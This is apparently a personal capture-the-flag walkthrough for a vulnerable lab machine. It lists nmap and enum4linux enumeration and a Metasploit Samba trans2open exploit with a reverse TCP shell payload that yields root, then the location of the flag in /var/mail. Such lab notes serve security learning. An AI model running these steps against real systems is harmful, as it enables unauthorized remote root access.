Steps Taken
1.) Scan network
  Use arp-scan -l(optionally nmap [network ID], or netdiscover(?))
2.) Enumerate
  Use enum4linux to scan them
  nmap -T4 -p- -sV 192.168.1.101 also helps to find what's on the ports
3.) searchsploit samba, since samba 2.2.1a is known to be vulnerable
4.) Metasploit
  msfconsole to open Metasploit
  enter command: use exploit/linux/samba/trans2open
    This enters the menu for that exploit and set:
      RHOSTS to the victim IP
      Payload to linux/x86/shell_reverse_tcp
      Set LHOST to native IP
  exploit
At this point, the terminal should be logged in to root and you can enter whoami to check
5.) find the flag
  normally, this would be found in a flag.txt somewhere, but this one has it in /var/mail
    older boxes apparently do this because you're supposed to be thinking about where all the sensitive data is
6.) milkshakes
